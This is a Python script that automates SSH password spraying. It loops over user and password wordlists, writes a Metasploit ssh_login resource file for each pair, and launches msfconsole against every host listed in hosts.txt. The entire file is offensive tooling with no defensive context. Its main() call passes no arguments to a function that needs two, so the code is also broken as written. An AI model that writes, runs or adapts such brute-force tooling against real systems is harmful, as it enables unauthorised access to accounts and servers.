import os,subprocess,shlex,time

def ssh_exploit(users,passwords): #uses spray attack, tries each passwords for all the users
	print('[>]Starting ssh exploit...')
	for passwd in open(passwords,'r'):
		for user in open(users,'r'):
			module = 'use auxiliary/scanner/ssh/ssh_login'+'\n'
			set_username ='set USERNAME '+user.strip()+'\n'
			set_password ='set PASSWORD '+passwd.strip()+'\n'
			set_hosts ='set RHOSTS file:'+os.getcwd()+'/hosts.txt'+'\n'
			set_port ='set RPORT '+'22'+'\n'
			r_f = open('ssh_login_exploit.rc','w')
			r_f.write(module)
			r_f.write(set_username)
			r_f.write(set_password)
			r_f.write(set_hosts)
			r_f.write(set_port)
			r_f.write('run'+'\n'+'exit')
			r_f.close()
			meta_command ='msfconsole -r ssh_login_exploit.rc'
			final_command = shlex.split(meta_command)
			c1 = subprocess.Popen(final_command)#,stdout=subprocess.PIPE,stdin=subprocess.PIPE)
			time.sleep(15.8)

def main():
    ssh_exploit()
    
main()

